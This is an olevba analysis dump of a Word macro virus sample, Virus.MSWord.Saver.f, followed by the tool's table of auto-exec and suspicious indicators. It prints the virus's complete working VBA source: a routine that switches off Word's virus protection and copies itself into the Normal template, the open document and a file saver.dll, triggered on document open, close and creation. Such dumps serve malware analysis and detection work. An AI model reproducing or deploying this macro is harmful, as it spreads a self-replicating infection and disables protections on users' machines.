olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Saver.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Saver.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Valentine.bas 
in file: Virus.MSWord.Saver.f - OLE stream: 'Macros/VBA/Valentine'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Setup()
  Word.Options.VirusProtection = False
  On Error Resume Next
  If Word.ActiveDocument.Name = "Doc2.doc" Then MsgBox "Âàñ ïðèâåòñòâóåò Çàðàçà!"
  If Word.ActiveDocument.Name = "saver.dll" Then MsgBox "Saver!"
    
  zz = Word.ActiveDocument.FullName
  
  Application.OrganizerCopy Source:=zz, _
      Destination:=Normal.ThisDocument.FullName, Name:="Valentine", _
      Object:=wdOrganizerObjectProjectItems
      
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=zz, Name:="Valentine", _
      Object:=wdOrganizerObjectProjectItems
      
  yy = Word.Application.Path + "\saver.dll"
  
    
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=yy, Name:="Valentine", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=zz, _
      Destination:=yy, Name:="Valentine", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=yy, _
      Destination:=zz, Name:="Valentine", _
      Object:=wdOrganizerObjectProjectItems
      
End Sub
Sub AutoNew()
 Setup
End Sub
Sub AutoOpen()
  Setup
  End Sub
  Sub AutoClose()
  Setup
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |saver.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

